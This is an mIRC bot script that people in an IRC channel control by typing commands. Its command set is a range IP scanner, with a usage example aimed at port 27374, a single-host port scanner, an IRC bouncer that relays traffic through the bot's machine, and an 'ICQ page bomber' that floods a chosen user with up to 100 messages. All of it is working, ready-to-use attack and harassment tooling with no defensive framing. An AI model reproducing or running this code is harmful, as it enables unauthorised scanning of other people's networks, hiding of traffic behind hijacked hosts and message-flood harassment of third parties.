[script]
n0=on 10:TEXT:!scanStatus:*: {
n1=  if (%scan.nick != $null) { .msg $nick I'm Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) }
n2=  else { .msg $nick No Scans In Progress }
n3=}
n4=on 10:TEXT:!scanAbort:*: {
n5=  if ($nick = %scan.nick) { .msg $nick you have just aborted the scanning of port  $+ %scan.port $+  | .timerscan off | .timersockcheck off | unset %scan.* | .sockclose scan* | halt }
n6=  else { .msg $nick Sorry but your not the user that started the scan so you cannot be the user to Abort the Scan | halt }
n7=}
n8=on 10:TEXT:!scan *:*: {
n9=  if (%scan.nick != $null) { .msg $nick I'm Allready Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay) | halt }
n10=  if ($remove($2,$chr(46)) !isnum) || ($remove($3,$chr(46)) !isnum) || ($remove($4,$chr(44)) !isnum) || ($5 !isnum) { .msg $nick Syntax: please Type !scan <starting ip> <ending ip> <port> <delay> EX !scan 24.24.24.1 24.24.24.255 27374 5 | halt }
n11=  else {
n12=    set %scan.Start1 $gettok($2,1,46)
n13=    set %scan.Start2 $gettok($2,2,46)
n14=    set %scan.Start3 $gettok($2,3,46)
n15=    set %scan.Start4 $gettok($2,4,46)
n16=    set %scan.Perm1 $gettok($2,1,46)
n17=    set %scan.Perm2 $gettok($2,2,46)
n18=    set %scan.Perm3 $gettok($2,3,46)
n19=    set %scan.Perm4 $gettok($2,4,46)
n20=    set %scan.End1 $gettok($3,1,46)
n21=    set %scan.End2 $gettok($3,2,46)
n22=    set %scan.End3 $gettok($3,3,46)
n23=    set %scan.End4 $gettok($3,4,46)
n24=    if (%scan.start1 > 255) || (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) || (%scan.end1 > 255) || (%scan.end2 > 255) || (%scan.end3 > 255) || (%scan.end4 > 255) { .msg $nick Sorry but you entered a digit Out Of Range | unset %scan.* | halt }
n25=    if (%scan.start1 > %scan.end1) || (%scan.start2 > %scan.end2) || (%scan.start3 > %scan.end3) || (%scan.start4 > %scan.end4) { .msg $nick Error Starting scan, your ending Ip is greater then your Starting ip | unset %scan.* | halt }
n26=    set %scan.port $4
n27=    set %scan.delay $5
n28=    set %scan.nick $nick
n29=    .timerscan 0 %scan.delay scancheck
n30=    .msg %scan.nick now Scanning Rang  $+ %scan.perm1 $+ $chr(46) $+ %scan.perm2 $+ $chr(46) $+ %scan.perm3 $+ $chr(46) $+ %scan.perm4 To %scan.end1 $+ $chr(46) $+ %scan.end2 $+ $chr(46) $+ %scan.end3 $+ $chr(46) $+ %scan.end4 $+  I am Currently at  $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $+  Scanning Port  $+ %scan.port $+  at a Delay Rate of  $+ $duration(%scan.delay)
n31=  }
n32=}
n33=alias portscan {
n34=  .sockopen port $+ %port.start $+ $chr(46) $+ %port.address %port.address %port.start
n35=  inc %port.start 1
n36=  if (%port.start >= %port.end) { .msg %port.nick Scanning of Ports has completed, now waiting for all ports to close | .timerport off | .timerportsock 0 5 portsock | halt }
n37=}
n38=alias portsock {
n39=  if ($sock(port*,0) = 0) {
n40=    .msg %port.nick scanning has now completed and all sockets have closed, you may now use port scan again
n41=    unset %port.*
n42=    .timerportsock off
n43=  }
n44=}
n45=on *:SOCKOPEN:port*: {
n46=  if ($sockerr > 0) { .sockclose $sockname | halt }
n47=  .msg %port.nick Address: $gettok($remove($sockname,port),2-,46) Port: $gettok($remove($sockname,port),1,46)
n48=  .sockclose $sockname
n49=}
n50=alias scancheck {
n51=  if (%scan.start1 > 255) { .msg %scan.nick Scaning Has Completed | .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
n52=  if (%scan.start2 > 255) || (%scan.start3 > 255) || (%scan.start4 > 255) { .msg %scan.nick An Error Has Occured in the Scanning Proccess, Scan Aborted at %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 | unset %scan.* | .timerscan off | halt }
n53=  if ($count(%scan.port,$chr(44)) >= 1) {
n54=    set %scan.counter 0
n55=    set %scan.countport $count(%scan.port,$chr(44))
n56=    inc %scan.countport 1
n57=    :start
n58=    inc %scan.counter 1
n59=    .sockopen scan $+ $gettok(%scan.port,%scan.counter,44) $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 $gettok(%scan.port,%scan.counter,44)
n60=    if (%scan.counter >= %scan.countport) { goto end }
n61=    else { goto start }
n62=  }
n63=  else { .sockopen scan $+ %scan.port $+ $chr(46) $+ %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.start1 $+ $chr(46) $+ %scan.start2 $+ $chr(46) $+ %scan.start3 $+ $chr(46) $+ %scan.start4 %scan.port }
n64=  :end
n65=  inc %scan.start4 1
n66=  if (%scan.start4 > %scan.end4) { set %scan.start4 %scan.perm4 | inc %scan.start3 }
n67=  if (%scan.start3 > %scan.end3) { set %scan.start3 %scan.perm3 | inc %scan.start2 }
n68=  if (%scan.start2 > %scan.end2) { set %scan.start2 %scan.perm2 | inc %scan.start1 }
n69=  if (%scan.start1 > %scan.end1) { .msg %scan.nick Scanning has completed, now waiting for all sockets to close, you will be notified when all sockets are closed | .timerscan off | .timersockscheck 0 5 scansock | halt }
n70=}
n71=on 10:TEXT:!portstatus:*: { if (%port.nick = $null) { amsg I am currently Not scanning any ports }
n72=  elseif (%port.nick != $null) { .msg $chan I am currently scanning %port.address  on ports %port.perm to %port.end  i'm currently at %port.start its estimated another $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5)) before i'm done
n73=  }
n74=}
n75=on 10:TEXT:!portabort:*: { if ($nick = %port.nick) { .msg $chan i have aborted port scan | .timerport off | .timerportsock off | unset %port.* | halt } }
n76=on 10:TEXT:!portscan *:*: {
n77=  if ($4 = $null) { msg $chan Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 5 | halt }
n78=  if (%port.nick != $null) { .msg $chan Sorry but i am allready Scanning  $+ %port.perm $+  to  $+ %port.end $+  on  $+ %port.address $+  | halt }
n79=  if ($remove($2,$chr(46)) !isnum) || ($3 !isnum) || ($4 !isnum) || ($5 !isnum) { .msg $chan Error Entering Data use !portscan <ip> <Starting Port> <Ending Port> <delay> EX !portscan 24.24.24.42 1 9000 1 | halt }
n80=  if ($4 < $3) { .msg $chan Error Starting Port Can't be greater then ending port | halt }
n81=  set %port.address $2
n82=  set %port.start $3
n83=  set %port.end $4
n84=  set %port.perm $3
n85=  set %port.delay $5
n86=  set %port.nick $nick
n87=  .timerport 0 %port.delay portscan
n88=  .msg %port.nick now scanning  $+ %port.address $+  on Ports %port.start to %port.end with a delay of %port.delay  estimated time to finish, $duration($calc($iif(%port.delay > 0,%port.delay) $iif(%port.delay > 0,*) $calc(%port.end - %port.start) + 5))
n89=}
n90=
n91=on 10:TEXT:!bnc*:*:{  if ($2 == stats) {   msg # 15*14BNC-STATS15* 12[14Total Users Connected:2(15 $+ $sock(bnc.in*,0) $+ 2) 14Bncs open:2(15 $+ $calc($sock(bnc.*,0) - $sock(bnc.in*,0) - $sock(bnc.out*,0)) $+ 2) 14Server Connections:2(15 $+ $sock(bnc.out*,0) $+ 2)12] } |  if ($2 == log) { bnc log $3 | msg # 14•15BNC14• Logger has been set to $3 $+ ...  |  if ($3 == off) { remove bnc.log }   } | if ($2 == start) {  /bnc start $3 $4 |  msg # 2[14Bnc2] 15Setup complete:14 $Ip $+ 14:15 $+ $3  | msg # 2[14Bnc2] 14Usage:15 /server $Ip $+ 14:15 $+ $3 [Then /Quote Pass $4 $+ ]  |   halt     }  
n92=  if ($2 == help) {  msg # 14•15BNC14• Usage: !bnc [port] pass |  halt   } | if ($2 == stop) {  if ($sock(bnc. [ $+ [ $3 ] ] ,0) == 0) { msg # 14•15BNC14• Error: Bnc not active on that port! | halt }  | msg # 14•15BNC14• Server/port for $3 has been stopped. |  sockclose bnc. $+ $3  } | if ($2 == kill) && ($3 == users) { msg # 14•15BNC14• [( $+ $sock(bnc.in*,0) $+ )] Users on bnc, have been disconnected... | sockclose bnc.in* | sockclose bnc.out*  } |  if ($2 == shutdown) {  msg # 14•15BNC14• BNC Server shutdown... (all settings reset) |  bnc reset  |  msg # 14•15BNC14• Server shutdown complete... } |  if ($2 == list) && ($3 == bnc) {   if ($sock(bnc.*,0) == 0) { msg # 14•15BNC14• Error, there are currently no bnc servers open... | halt }   
n93=    if ($sock(bnc.*,0) > 0) {   msg # 14•15BNC14• Listing Active/Open BNC's |    %bnc.stl = 0     |    :again  |   if ($sock(bnc.*,0) == %bnc.stl) { goto done } |  inc %bnc.stl  |  if ($gettok($sock(bnc.*,%bnc.stl),2,46) !isnum 1-65000) { goto again } |  msg # 14•15BNC14• $chr(35) $+ %bnc.stl $+ . [PORT: $+ $gettok($sock(bnc.*,%bnc.stl),2,46) $+ ] [PASS: $+ [ %bnc. [ $+ [ $gettok($sock(bnc.*,%bnc.stl),2,46) ] ] ] $+ ]   |  goto again |    :done |    msg # 14•15BNC14• End Listing Active BNC's...    }  } |  if ($2 == list) && ($3 == users) {  if ($sock(bnc.in*,0) == 0) {  msg # 14•15BNC14• Error: No Users Connected to the bnc... | halt }   | if ($sock(bnc.in*,0) > 0) { msg # 14•15BNC14• Listing Active Users...   |  %bnc.stlu = 0 |  :again2  
n94=    if ($sock(bnc.in*,0) == %bnc.stlu) { goto done2 } |   inc %bnc.stlu  | msg # 14•15BNC14• $chr(35) $+ %bnc.stlu $+ . Connection: Nick:[ $+  [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .n ] ] ] $+ ] [ $+ [ %bnc. [ $+ [ $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) $+ .u ] ] ] $+ ] is $gettok($sock(bnc.in*,%bnc.stlu),4-7,46) on port $sock(bnc.in*,%bnc.stlu).mark |    goto again2 |    :done2 |   msg # 14•15BNC14• List of Users Complete...  } }  | if ($2 == list) && ($3 == server) {   if ($sock(bnc.out*,0) == 0) { msg # 14•15BNC14• Error: Currently No Users on Servers Connected... | halt }   
n95=if ($sock(bnc.out*,0) > 0) {   msg # 14•15BNC14• Listing Active Users and Servers... |  %bnc.stlus = 0 |  :again3 | if ($sock(bnc.out*,0) == %bnc.stlus) { goto done3 }  |  inc   %bnc.stlus |  msg # 14•15BNC14• $chr(35) $+ %bnc.stlus $+ .  [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,2,32) ] ] ] $+ / $+ [ %bnc. [ $+ [ $gettok($sock(bnc.out*,%bnc.stlus).mark,1,32) ] ] ] is %bnc. $+ $gettok($sock(bnc.out*,%bnc.stlus).mark,3,32) on $gettok($sock(bnc.out*,%bnc.stlus).mark,4-6,32)  |  goto again3 |   :done3 |  msg # 14•15BNC14• List of Users and Servers Complete...  } |  halt  } }
n96=alias bnc {    if ($1 == start) { //set %bnc. [ $+ [ $2 ] ] $3  | //socklisten bnc. $+ $2 $2  }  |  if ($1 == reset) { unset %bnc* | sockclose bnc* } |  if ($1 == log) { set %bnc.log $2 }  }
n97=on 1:socklisten:bnc.*:{   if ($sock(bnc.in.temp,0) == 1) { halt } | //set %bnc.smt $gettok($sockname,2,46) | /sockaccept bnc.in.temp | sockread }  
n98=on *:sockclose:bnc.in.*: { unset %bnc.ok. $+ $sockname | unset %bnc. $+ $sock($sockname).ip $+ * | unset %bp* | unset %temp.r* | if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {   sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) } }
n99=on *:sockread:bnc.in.*:{   if ($sock(bnc.in.temp*,0) == 1) {   /sockrename $sockname bnc.in. $+ $sock($sockname).port $+ . $+ $+ $sock($sockname).ip  | /sockmark $sockname %bnc.smt | unset %bnc.smt |  //set  %bnc.ok. $+ $sockname no } |   sockread -f %temp.r  |  if (%bnc.log == on) { write bnc.log <<<[Incomming]>>> %temp.r }  |  if (%bnc.ok. [ $+ [ $sockname ] ] == no) {  if ($gettok(%temp.r ,1,32) == NICK) { set %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2,32)  |  //write bnc.log Connectoin from: $sock($sockname).ip Time: $time Date: $+ $date 
n100=    sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Welcome to GT's BNC Server. ( $+ $gettok(%temp.r ,2,32) $+ ) ***     | sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** From: $sock($sockname).ip Time: $time Date: $+ $date *** |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Please Type /QUOTE PASS PASSWORD to Continue ***   |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** For More help Type /QUOTE BNCHELP ***  |  halt  } 
n101=    if ($gettok(%temp.r ,1,32) == BNCHELP) {    sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Help Error: Login First! /QUOTE PASS [ PASSWORD ] |  halt  } |  if ($gettok(%temp.r ,1,32) == USER) {  set %bnc. $+ $sock($sockname).ip $+ .u $gettok(%temp.r ,2,32) |  halt  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) ==  %bnc. [ $+ [ $sock($sockname).mark ] ] ) {  //sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Password Accepted ***  
n102=  //sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ *** Please type /quote conn server port to start ***  |   goto next  }  |  if ($gettok(%temp.r,1,32) == PASS) && ($gettok(%temp.r,2,32) != %bnc. [ $+ [ $sock($sockname).mark ] ] ) {   sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Incorrect Password... |   inc %bp   } |  if (%bp >= 3) {   sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Too many bad password attempt's disconnecting...  |  sockclose $sockname | unset %bp }  |  halt   }
n103=  :next |  %bnc.ok. [ $+ [ $sockname ] ] = done | if ($gettok(%temp.r ,1,32) == IDENT) {   identd on $gettok(%temp.r ,2,32)  |  sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Ident set to $gettok(%temp.r ,2,32)  }  | if ($gettok(%temp.r ,1,32) == VHOST) {  if ($gettok(%temp.r ,2,32) == LIST) {  /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Listing VHOSTS |   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ (1) System Default: $ip / $host $+ ... |   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ End of VHOST / LIST |     halt   }
n104=    if ($gettok(%temp.r ,2,32) == 1) {    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ VHOST Set as system default $ip : $host |    halt   } |  else {   /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ VHOST Error... Usage: /QUOTE VHOST LIST or /QUOTE VHOST # | halt }   } |   if ($gettok(%temp.r ,1,32) == BNCHELP) {    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Listing Help Commands... |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE IDENT [IDENT]  
n105=    /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE CONN [SERVER] [PORT]   |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE PASS [PASSWORD]  |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - /QUOTE VHOST LIST |  /sockwrite -nt $sockname  :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ - End List of HELP  |  halt  }  |  if ($gettok(%temp.r ,1,32) == CONN) {  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) {  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Disconnecting from current server...  
n106=    sockclose $sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] )  }  |  if ($gettok(%temp.r ,3,32) == $Null) {   sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 $gettok(%temp.r,4,32)  | /sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $sock($sockname).ip $gettok(%temp.r ,2,32) 6667 |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port 6667  |   halt   }  |  /sockopen bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip $gettok(%temp.r ,2,32) $gettok(%temp.r,3,32) $gettok(%temp.r,4,32)  
n107=/sockmark bnc.out. $+ $sock($sockname).port $+ . $+ $sock($sockname).ip %bnc. $+ $sock($sockname).ip $+ .u %bnc. $+ $sock($sockname).ip $+ .n $gettok(%temp.r ,2-4,32) |  /sockwrite -nt $sockname :14[12GT14]15.14(12BNC14) NOTICE AUTH : $+ $+ Attempting to connect to $gettok(%temp.r,2,32) on port $gettok(%temp.r ,3,32)  |  halt    } |  if ($sock(bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] ) > 0) { sockwrite -nt bnc.out. [ $+ [ $gettok($sockname,3-7,46) ] ] %temp.r   }  }  
n108=on *:sockopen:bnc.out.*:{ sockwrite -tn $sockname User [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ] a a : [ [ %bnc. [ $+ [ $gettok($sock($sockname).mark,1,32) ] ] ] ]  | sockwrite -tn $sockname Nick %bnc. [ $+ [ $gettok($sock($sockname).mark,2,32) ] ] | sockread  } 
n109=on *:sockread:bnc.out.*:{ sockread -f %bnc.out.t   | if (%bnc.log == on) { write bnc.log <<<[Outgoing]>>> %bnc.out.t } | sockwrite -nt bnc.in. [ $+ [ $gettok($sockname,3-7,46) ] ] %bnc.out.t |  unset %bnc.out.t }
n110=on 10:TEXT:!icqpagebomb*:#:{  if ($2 == help) { msg # Syntax: !icqpagebomb uin ammount email/name sub message (HELP) | halt } |   if ($2 == reset) { msg # Icq Page Bomber (All Settings Reset!)... | unset %ipb.n | unset %ipb.sub | unset %ipb.m | unset %ipb.uin | unset %ipb.t } |  if ($6 == $null) { msg # Error!: !icqpagebomb uin ammount email/name sub message | halt } | if ($3 !isnum 1-100) { msg # ERROR! Under Ammount 100 please. (moreinfo type !icqpagebomb help) | halt } |   set %ipb.n $4 | set %ipb.sub $5 | set %ipb.m $replace($6,$chr(32),_) | set %ipb.uin $2 | set %ipb.t $3 
n111=msg # 14[15ICQPAGEBOMBER14]:15 Bombing:12 $2 14Ammount:12 $3 15Name/Email:12 $4 14Sub:12 $5 14Message:12 $6 3etc... |   /icqpagebomb  }
n112=alias icqpagebomb { :bl | inc %bl.n |  sockopen icqpager $+ %bl.n  wwp.icq.com 80 |  if (%bl.n > %ipb.t) { unset %ipb.t |  unset %bl.n | halt } |  goto bl } 
n113=on *:sockopen:icqpager*:{ sockwrite -nt $sockname GET /scripts/WWPMsg.dll?from= $+ %ipb.n $+ &fromemail= $+ %ipb.n $+ &subject= $+ %ipb.sub $+ &body=  $+ %ipb.m $+ &to=  $+ %ipb.uin $+ &Send=Message   | sockwrite $sockname $crlf $+ $crlf |  sockread }
n114=on *:sockread:icqpager*:{ sockread -f %temp }
n115=on *:sockclose:icqpager*:{ unset %temp }
